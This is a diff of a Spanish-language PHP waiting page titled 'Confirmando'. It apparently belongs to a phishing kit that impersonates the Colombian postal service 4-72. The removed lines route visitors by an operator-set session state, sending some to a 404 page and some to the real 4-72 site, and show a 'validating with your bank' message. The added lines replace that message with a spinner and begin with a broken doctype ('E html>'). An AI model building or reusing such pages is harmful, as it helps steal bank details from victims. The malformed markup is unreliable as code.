@@ -1,22 +1,4 @@
-<?php
-
-session_start();
-
-if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){
-
-
-}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){
-
-    header('location:/404.php');
-
-}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){
-
-    header('location:https://www.4-72.com.co/publicaciones/236/personas/');
-}
-
-?>
-
-<!DOCTYPE html>
+E html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -24,7 +6,7 @@ if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
 
-    <title>Confirmando</title>
+    <title>Confirmando...</title>
     
   <style>
 
@@ -33,18 +15,31 @@ if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){
   padding: 0;
   font-family: Arial, Helvetica, sans-serif;
 }
+  .spinner-container {
+      margin-bottom: 2rem;
+    }
+
+    .spinner {
+        width: 60px;
+        height: 60px;
+        border: 4px solid rgba(232, 17, 75, 0.2);
+        border-left: 4px solid rgb(232, 17, 75);
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin: 0 auto 3rem;
+    }
 </style>
 
 </head>
 <body style="">
 
 
-<center><div style="width: 90%;margin-top: 35%;">    
-  
-  <a style="font-size: 20px;">Espere un momento. <br> Estamos realizando unas validaciones con su banco</a><br>
-   
-  <img src="/assets/img/loader.gif" alt="" width="100%">
-  <a style="font-size: 20px;">No tardará más de un minuto.</a></center>
+<center>
+  <div style="width: 90%;margin-top: 45%;">    
+    <div class="spinner-container">
+      <div class="spinner"></div>
+  </div>
+</center>
 
 </div>
 
